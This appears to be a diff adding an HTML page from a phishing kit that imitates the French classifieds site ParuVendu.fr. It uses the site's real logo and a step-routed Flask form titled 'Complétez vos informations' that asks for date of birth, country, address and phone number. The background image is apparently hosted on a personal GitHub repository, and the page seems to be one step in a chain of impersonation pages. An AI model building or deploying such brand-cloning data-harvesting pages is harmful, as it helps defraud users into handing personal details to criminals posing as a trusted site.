@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informations supplémentaires - ParuVendu.fr</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
+            min-height: 100vh; /* Utilisation de min-height pour permettre le défilement */
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+            overflow-y: auto; /* Activation du défilement pour tout le body */
+        }
+        .logo {
+            position: fixed; /* Fixe le logo en haut à gauche */
+            top: 20px;
+            left: 20px;
+            z-index: -1; /* Met le logo en arrière-plan */
+            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+        }
+        .logo img {
+            width: 200px;
+            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+        }
+        .container {
+            width: 60%; /* Largeur du formulaire augmentée */
+            padding: 40px; /* Padding plus important */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2); /* Ombre plus prononcée */
+            position: relative; /* Position relative pour permettre le défilement */
+            margin-top: 120px; /* Espace en haut pour éviter que le formulaire ne soit caché par le logo */
+            margin-bottom: 50px; /* Espace en bas pour permettre le défilement */
+            animation: slideUp 1s ease-out;
+            border: 2px solid #ff4c4c; /* Bordure rouge pour mettre en évidence */
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px); /* Début légèrement en bas */
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0); /* Fin en position normale */
+                opacity: 1;
+            }
+        }
+        .form-group {
+            margin-bottom: 20px; /* Espacement entre les champs augmenté */
+            text-align: left;
+        }
+        input, select {
+            width: 100%; /* Largeur des champs */
+            padding: 15px; /* Padding plus important */
+            border: 1px solid #ccc;
+            border-radius: 5px; /* Bordures légèrement arrondies */
+            font-size: 16px; /* Taille de police augmentée */
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus, select:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 8px rgba(255, 76, 76, 0.6); /* Ombre plus prononcée au focus */
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge plus foncé */
+            color: white;
+            padding: 12px 25px; /* Taille du bouton augmentée */
+            border: none;
+            border-radius: 25px; /* Bordures plus arrondies */
+            cursor: pointer;
+            width: 50%; /* Bouton plus large */
+            font-size: 16px; /* Taille du texte augmentée */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 24px; /* Taille de police augmentée */
+            font-weight: bold;
+            color: #ff4c4c;
+            margin-bottom: 30px; /* Espacement augmenté */
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 30px; /* Espacement augmenté */
+            z-index: -1; /* Met le logo du formulaire en arrière-plan */
+            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+        }
+        .form-logo img {
+            width: 120px; /* Taille du logo augmentée */
+            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu.fr">
+    </div>
+    <div class="container">
+        <div class="connexion-text">Complétez vos informations</div>
+        <div class="form-logo">
+            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <form action="{{ url_for('next_page', current_page='paruinformations') }}" method="GET">
+            <div class="form-group">
+                <label for="birthdate">Date de naissance (JJ/MM/AAAA)</label>
+                <input type="text" id="birthdate" placeholder="JJ/MM/AAAA" required>
+            </div>
+            <div class="form-group">
+                <label for="country">Pays</label>
+                <select id="country" required>
+                    <option value="">Sélectionnez votre pays</option>
+                    <option value="france">France</option>
+                    <option value="belgique">Belgique</option>
+                    <option value="suisse">Suisse</option>
+                    <option value="allemagne">Allemagne</option>
+                    <option value="espagne">Espagne</option>
+                    <option value="italie">Italie</option>
+                    <option value="portugal">Portugal</option>
+                    <option value="royaume-uni">Royaume-Uni</option>
+                    <option value="irlande">Irlande</option>
+                    <option value="pays-bas">Pays-Bas</option>
+                    <option value="luxembourg">Luxembourg</option>
+                    <option value="autriche">Autriche</option>
+                    <option value="danemark">Danemark</option>
+                    <option value="suede">Suède</option>
+                    <option value="finlande">Finlande</option>
+                    <option value="norvege">Norvège</option>
+                    <option value="pologne">Pologne</option>
+                    <option value="republique-tcheque">République Tchèque</option>
+                    <option value="hongrie">Hongrie</option>
+                    <option value="slovaquie">Slovaquie</option>
+                    <option value="grece">Grèce</option>
+                    <option value="turquie">Turquie</option>
+                    <option value="canada">Canada</option>
+                    <option value="etats-unis">États-Unis</option>
+                    <option value="australie">Australie</option>
+                    <option value="nouvelle-zelande">Nouvelle-Zélande</option>
+                    <!-- Pays africains -->
+                    <option value="maroc">Maroc</option>
+                    <option value="algerie">Algérie</option>
+                    <option value="tunisie">Tunisie</option>
+                    <option value="senegal">Sénégal</option>
+                    <option value="cote-divoire">Côte d'Ivoire</option>
+                    <option value="cameroun">Cameroun</option>
+                    <option value="nigeria">Nigeria</option>
+                    <option value="ghana">Ghana</option>
+                    <option value="kenya">Kenya</option>
+                    <option value="afrique-du-sud">Afrique du Sud</option>
+                    <option value="egypte">Égypte</option>
+                    <option value="mali">Mali</option>
+                    <option value="benin">Bénin</option>
+                    <option value="togo">Togo</option>
+                    <option value="burkina-faso">Burkina Faso</option>
+                    <!-- Autres pays -->
+                    <option value="japon">Japon</option>
+                    <option value="chine">Chine</option>
+                    <option value="inde">Inde</option>
+                    <option value="bresil">Brésil</option>
+                    <option value="argentine">Argentine</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="address">Adresse</label>
+                <input type="text" id="address" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Numéro de téléphone</label>
+                <input type="tel" id="phone" required>
+            </div>
+            <button type="submit" class="btn">Confirmer</button>
+        </form>
+    </div>
+</body>
+</html>
